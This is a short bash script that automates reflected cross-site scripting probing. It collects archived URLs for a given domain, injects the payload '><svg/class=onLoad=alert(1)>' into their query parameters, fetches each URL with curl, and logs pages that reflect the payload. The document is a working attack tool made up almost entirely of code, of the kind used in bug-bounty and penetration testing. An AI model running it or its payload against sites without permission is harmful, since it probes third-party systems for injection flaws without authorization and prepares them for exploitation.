#!/bin/bash

#	XSS CALLBACK:
#	Log file: active.XSS.log

	if [ $# -lt 1 ]; then
		echo "Usage: active.XSS target.com"
	else
	
		export HOST=$1

		echo -e "\033[0;32mRunning\n"; waybackurls $HOST | uro | gf xss | qsreplace "><svg/class=onLoad=alert(1)>" | while read url ; do curl -sk --path-as-is "$url" | if grep -qs "onLoad"; then echo -e "[Potential XXS VULN] $url" | anew active.XSS.log; else echo -e $url "\033[0;32mNot Vulnerable"; fi; done

	fi

#	--------------------------------------------------------------------------------------------------------------
#	--------------------------------------------------------------------------------------------------------------